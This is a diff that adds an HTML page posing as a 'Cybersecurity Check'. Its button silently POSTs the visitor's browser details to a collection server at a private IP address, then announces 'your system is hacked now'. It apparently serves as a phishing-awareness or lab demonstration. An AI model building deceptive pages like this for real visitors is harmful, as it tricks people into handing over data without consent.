@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cybersecurity Check</title>
+</head>
+<body>
+    <h1>Check Your Cybersecurity Score</h1>
+    <button onclick="collectData()">Click Here</button>
+
+    <script>
+        function collectData() {
+            // Attempt to retrieve the username from the system
+            const username = window.navigator.userAgent.includes("Windows") 
+                ? "Unable to detect directly on Windows. Use server-side methods." 
+                : "Fetch with server-side.";
+
+            // Send a POST request to the Flask server
+            fetch('http://10.1.7.122:5000/capture-details', {
+                method: 'POST',
+                body: JSON.stringify({
+                    username: username,  // Send username in the request body
+                    userAgent: navigator.userAgent  // Collect browser/OS details
+                }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            }).then(response => {
+                // Show the playful hacked message
+                alert('Congrats, your system is hacked now!');
+            }).catch(error => {
+                console.error('Error:', error);  // Log errors to the console
+            });
+        }
+    </script>
+</body>
+</html>
